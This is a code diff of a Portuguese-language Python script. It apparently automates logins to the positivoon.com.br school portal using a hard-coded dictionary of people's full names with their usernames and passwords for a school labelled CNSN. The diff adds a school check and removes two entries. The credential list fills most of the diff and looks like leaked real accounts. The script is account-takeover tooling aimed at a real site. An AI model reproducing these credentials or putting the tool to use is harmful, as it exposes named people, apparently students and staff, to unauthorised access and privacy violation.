@@ -6,8 +6,10 @@ from misc import prints
 from misc import tools
 from misc import loading
 
-def tryes(target, wordlist):
-    pwd = {
+def tryes(wordlist, school):
+    print(f"{t.hashtag_yellow} {c.cyan('Página não especificada, iniciando em https://positivoon.com.br/#/login')}")
+    time.sleep(0.7)
+    CNSN_pwd = {
     'Aline Talita de Carvalho': {
         'login': 'aline.cnsn2',
         'senha': 'bvh77*'
@@ -148,14 +150,6 @@ def tryes(target, wordlist):
         'login': 'wallacee.cnsn',
         'senha': 'nyk14*'
     },
-    'Marcia Henares Mello': {
-        'login': 'marciamelo.cnsn',
-        'senha': 'melo'
-    },
-    'Marcia Melo': {
-        'login': 'marciamelo',
-        'senha': 'yyax13'
-    },
     'João Batista Marques': {
         'login': 'joao',
         'senha': 'jbmjr'
@@ -186,6 +180,10 @@ def tryes(target, wordlist):
     }
 }
 
+    if school == "CNSN":
+        pwd = CNSN_pwd
+    else:
+        return "porra barth"
     while True:
         tr = r.choice(wordlist)
         if tr in pwd:
